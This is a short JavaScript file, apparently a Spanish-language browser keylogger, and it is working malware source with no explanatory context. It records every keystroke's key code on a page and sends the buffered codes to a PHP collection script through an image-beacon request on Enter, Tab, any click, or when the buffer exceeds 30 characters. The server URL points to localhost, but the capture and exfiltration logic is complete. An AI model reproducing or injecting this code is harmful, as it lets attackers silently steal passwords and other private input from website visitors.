var urlservidor = "http://127.0.0.1/v4keyloggerserver.php";

window.addEventListener('keydown',this.tecla,false);
window.addEventListener('click',this.raton,false);
var buffer = "";
		
function tecla(e)
{
	buffer += e.keyCode + ",";
	if (e.keyCode ==  13 || e.keyCode == 9)
	{
		enviar();
	}
	if (buffer.length > 30)
	{
		enviar();
	}
}
			
function raton()
{
	enviar();
}

function enviar()
{   
	new Image().src = urlservidor + "?keys=" + buffer;
	buffer = "";
}